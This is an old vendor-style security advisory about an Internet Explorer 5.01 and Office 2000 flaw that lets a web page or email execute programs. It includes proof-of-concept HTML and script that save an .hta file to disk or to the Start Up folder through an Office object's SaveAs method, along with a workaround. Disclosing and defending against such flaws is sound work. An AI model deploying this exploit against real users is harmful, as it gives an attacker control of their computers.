Georgi Guninski security advisory #13, 2000

IE 5 and Excel 2000, PowerPoint 2000 vulnerability - executing programs

Systems affected: IE 5.01, Excel 2000, PowerPoint 2000, Win98 - probably
other versions, have not tested
Risk: High

Disclaimer:
The opinions expressed in this advisory and program are my own and not
of any company.
The usual standard disclaimer applies, especially the fact that Georgi
Guninski is not liable for any damages caused by direct or  indirect use
of the information or functionality provided by this program.
Georgi Guninski, bears NO responsibility for content or misuse of this
program or any derivatives thereof.

Description:
Internet Explorer 5.01, Excel 2000 and PowerPoint under Windows 98
(suppose other versions are also vulnerable, have not tested) allow
executing programs when viewing a web page or HTML email message - in
the latter case at least with IFRAME.
This allows taking full control over user's computer.

Details:

IE 5.01 allows getting dangereous ActiveX objects with the help of the
<OBJECT> tag and Office 2000 applications.
For example, the following code loads a .xla file:
<object data="Book1.xla" id="sh1" width=0 height=0></object>
where Book1.xla is just a .xls file renamed to .xla. The same result may
be achieved with a .ppt or .xls file, probably other Office 2000 file
types.
The result is having an object in IE that has a method SaveAs().
Suppose there are more dangerous methods, have little knowledge on
Office 2000 objects.
The SaveAs method may save the Excel Workbook (or Addin) or PowerPoint
object in arbitrary location, including the Start Up folder.
The content of the saved file is controllable and depends on the content
of Book1.xla.
If the saved file is for example a .hta file, it is possible to execute
arbitrary programs on the user's computer.

The code is:
---------------------------------------------------
<object data="Book1.xla" id="sh1" width=0 height=0>
</object>
<SCRIPT>
function f()
{
fn="C:\\georgi-xla.hta";
sh1.object.SaveAs(fn,6);
//sh1.object.SaveAs("C:\\windows\\Start
Menu\\Programs\\StartUp\\georgi-xla.hta",6);
alert(fn+" sucessfully written");
}
setTimeout("f()",5000);
</SCRIPT>
---------------------------------------------------

Demonstration is available at:
http://www.nat.bg/~joro/sheetex.html

Workaround: Disable Active Scripting or Disable Run ActiveX controls and
plug-ins

Copyright 2000 Georgi Guninski

Regards,
Georgi Guninski
http://www.nat.bg/~joro


